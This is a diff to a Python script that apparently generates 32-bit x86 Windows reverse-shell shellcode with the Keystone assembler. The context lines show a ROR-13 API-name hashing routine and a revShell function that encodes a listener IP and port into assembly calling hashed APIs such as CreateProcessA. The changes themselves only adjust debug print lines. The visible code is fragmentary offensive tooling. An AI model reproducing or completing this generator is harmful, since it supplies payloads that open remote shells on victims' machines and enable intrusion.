@@ -12,7 +12,7 @@ def getHash(string):
             break
         hash = (hash >> 13) | ((hash << (32 - 13)) & 0xFFFFFFFF)
         hash += ord(c)
-    print(f"{string}: {hash}, {hex(hash)}")
+    # print(f"{string}: {hash}, {hex(hash)}")
     return str(hex(hash))
 
 
@@ -83,7 +83,7 @@ def revShell(lhost, lport):
     ipaddr = "".join("{:02x}".format(int((c))) for c in lhost.split(".")[::-1])
     hexport = "".join("{:04X}".format((int(lport))))
     port = f"{hexport[2:]}{hexport[:2]}"
-    print(f"ipaddr: {ipaddr}, port: {port}")
+    print(f"ipaddr: {lhost}({ipaddr}), port: {lport}({port})")
     block = (
         f"push {getHash('CreateProcessA')}              ;"  # Hash for LoadLibraryA
         "call dword ptr [ebp+0x04]                      ;"  # Call find_function. Looks like find_function(LoadLibraryA)
@@ -210,7 +210,6 @@ def generate(mode, args):
     ks = Ks(KS_ARCH_X86, KS_MODE_32)
 
     encoding, count = ks.asm(assembly)
-    print(f"Encoded {count} instructions")
 
     # beautify assembly
 
